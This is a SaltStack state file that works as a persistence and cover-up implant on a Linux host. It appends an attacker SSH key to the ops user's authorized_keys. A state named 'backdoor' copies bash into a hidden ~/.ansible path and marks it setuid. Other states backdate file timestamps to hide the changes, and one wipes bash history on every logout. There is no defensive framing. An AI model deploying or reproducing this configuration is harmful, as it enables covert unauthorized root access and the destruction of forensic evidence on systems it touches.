/home/ops/.ssh/authorized_keys:
  file.append:
    - text:
      - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRdpPgVJg/VFTgmLHmuhxqBzXpZetO2MECxnY3eylZFUp0ZkvZ7uFqj9H84I3xC+Mbtv/rrJZwLi/5G0Af7gW8ETG1VRlCiQLzwyUuXiENcMkaHx5gz/GnNB0X6MICP0Geteht4ccUzVbg4z5se9S+6fdfSP4+zgE4sq1IbU00SVJrIj86etNo/GCDNAfENb3/to1EW27Ldrk5wsaq0GCOHqyCHagmC3nVJgmx0ySmmyjKDY2N+Tz/5HZQ/6fpE2SsEkEa+kUHpEkWfoZhdyduZH9/11PBIEz8rBiVNcA/GSLywv1hXr4ieiyzsI3VL6tW6x4cqQwb08A0uPTdjUq1 ops@iZ253rfoiwkZ

chpermi:
  file.managed:
  - name: /home/ops/.ssh/authorized_keys
  - mode: 600
  - user: ops
  - grroup: ops

chmtime1:
  cmd.run:
    - name: touch -mt 1908121231 /home/ops/.ssh/authorized_keys && touch -mt 1908121231 /home/ops/.ssh

backdoor:
  cmd.run:
    - name: cp /bin/bash /home/ops/.ansible/.ansible && chmod 4755 /home/ops/.ansible/.ansible
chmtime2:
  cmd.run:
    - name: touch -mt 1908101413 /home/ops/.ansible/.ansible && touch -mt 1908101413 /home/ops/.ansible
/home/ops/.bash_logout:
  file.append:
    - text:
      - cat /dev/null > ~/.bash_history
chmtime3:
  cmd.run:
    - name: touch -mt 1908031107 /home/ops/.bash_history && touch -mt 1908031107 /home/ops/
